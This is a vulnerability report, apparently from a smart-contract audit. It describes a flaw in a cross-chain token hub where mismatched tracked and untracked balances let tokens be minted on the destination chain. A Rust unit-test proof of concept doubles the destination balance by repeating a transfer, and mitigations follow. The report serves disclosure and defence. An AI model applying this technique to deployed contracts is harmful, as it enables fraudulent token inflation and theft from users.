# Vulnerability details

## Impact
The current design allows for inconsistent balance tracking between chains, potentially leading to unlimited token minting on the destination chain. This occurs when a token is untracked on the source chain but tracked on the destination chain.

The issue arises from the following behavior:

- The `state::update_token_balance` function silently ignores balance updates for untracked tokens. 
- The `execute::execute_message` function does not verify if the token is tracked on both the source and destination chains before processing a transfer.

This vulnerability could be exploited to inflate the token supply on the destination chain, potentially leading to economic attacks and undermining the integrity of the cross-chain token system.


## Proof of Concept
Add the following POC to execute.rs. I have shown that you do the same transfer twice to double the balance on the destination chain.

```rust
fn test_untracked_balance_inconsistency() {
        let mut deps = setup();
    
        let source_chain: ChainName = "source-chain".parse().unwrap();
        let destination_chain: ChainName = "destination-chain".parse().unwrap();
        let source_address: Address = "trusted-source".parse().unwrap();
        let destination_address: Address = "trusted-destination".parse().unwrap();
    
        register_trusted_address(&mut deps.as_mut(), source_chain.as_ref(), &source_address);
        register_trusted_address(
            &mut deps.as_mut(),
            destination_chain.as_ref(),
            &destination_address,
        );
    
        let token_id = TokenId::new([1u8; 32]);
        let amount = Uint256::from(1000u128);
    
        // Initialize token as untracked on source chain 
        state::start_token_balance(
            deps.as_mut().storage,
            token_id.clone(),
            source_chain.clone(),
            false, // untracked
        )
        .unwrap();

        // Initialize token as tracked on destination chain
        state::start_token_balance(
            deps.as_mut().storage,
            token_id.clone(),
            destination_chain.clone(),
            true, // tracked
        )
        .unwrap();
    
        // Perform an interchain transfer
        let transfer_message = ItsMessage::InterchainTransfer {
            token_id: token_id.clone(),
            source_address: HexBinary::from_hex("1234").unwrap(),
            destination_address: HexBinary::from_hex("5678").unwrap(),
            amount,
            data: HexBinary::from_hex("abcd").unwrap(),
        };
        
        let its_hub_message = ItsHubMessage::SendToHub {
            destination_chain: destination_chain.clone(),
            message: transfer_message.clone(),
        };
    
        let payload = its_hub_message.abi_encode();
        let cc_id = CrossChainId::new(source_chain.clone(), "transfer-message-id").unwrap();
        
        // Execute the message
        execute_message(deps.as_mut(), cc_id, source_address.clone(), payload).unwrap();
    
        // Check balances after transfer
        let source_balance = state::may_load_token_balance(deps.as_ref().storage, &token_id, &source_chain).unwrap();
        let destination_balance = state::may_load_token_balance(deps.as_ref().storage, &token_id, &destination_chain).unwrap();
    
        // The source balance should remain untracked
        assert_eq!(source_balance, Some(TokenBalance::Untracked));
        // The destination balance should be updated
        assert_eq!(destination_balance, Some(TokenBalance::Tracked(amount)));
    
        // Attempt another transfer with the same amount
        let its_hub_message = ItsHubMessage::SendToHub {
            destination_chain: destination_chain.clone(),
            message: transfer_message.clone(),
        };
    
        let payload = its_hub_message.abi_encode();
        let cc_id = CrossChainId::new(source_chain.clone(), "second-transfer-message-id").unwrap();
        
        // This should succeed even though the source doesn't have enough balance
        execute_message(deps.as_mut(), cc_id, source_address.clone(), payload).unwrap();
    
        // Check balances after second transfer
        let source_balance = state::may_load_token_balance(deps.as_ref().storage, &token_id, &source_chain).unwrap();
        let destination_balance = state::may_load_token_balance(deps.as_ref().storage, &token_id, &destination_chain).unwrap();
    
        // The source balance should still be untracked
        assert_eq!(source_balance, Some(TokenBalance::Untracked));
        // The destination balance should be doubled
        assert_eq!(destination_balance, Some(TokenBalance::Tracked(amount * Uint256::from(2u128))));
    }    

```

## Tools Used
Manual Review. Unit Testing.


## Recommended Mitigation Steps
Consider either or both mitigations:

1. Implement a check in the execute_message function to ensure that tokens are tracked on both the source and destination chains before processing a transfer

2. Modify the update_token_balance function to return an error if an attempt is made to update an untracked balance
